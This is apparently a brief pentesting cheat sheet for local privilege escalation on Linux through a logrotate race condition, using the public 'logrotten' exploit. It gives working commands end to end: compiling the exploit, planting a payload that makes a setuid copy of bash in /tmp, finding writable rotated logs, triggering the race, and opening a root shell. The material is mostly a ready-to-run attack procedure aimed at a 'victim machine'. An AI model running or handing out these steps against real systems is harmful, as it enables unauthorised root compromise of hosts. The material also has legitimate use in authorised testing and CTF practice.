> I am probably wrong, 
## Version

Vulnerable version: `3.8.6`, `3.11.0`, `3.15.0`, `3.18.0`

```sh
logrotate --version
```

## Exploit

### Compile exploit

Compile the exploit and transfer the binary to victim machine

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

### Prepare exploiting

On victim machine, create a payload to execute

```sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payload
```

Find out:

- What mode `logrotate` operate, whether `create` or `compress`?
- What log files does it rotate?
- Do you have write permission on the log? (YOU NEED WRITE PERMISSION)

```sh
cat /etc/logrotate.conf | grep -v "#"
cat /etc/logrotate.d/* | grep -v "#"
```

### Exploiting fr

Run the exploit on victim machine. You might need to run multiple times

If the logratate mode is `compress`, you need to add `-c` flag

```sh
./logrotten -p ./payload /path/to/log/file/you/can/write &
echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' >> /path/to/log/file/you/can/write
```

Check `/tmp/bash` regularly, see if the binary is created, if yes then

```sh
/tmp/bash -p
```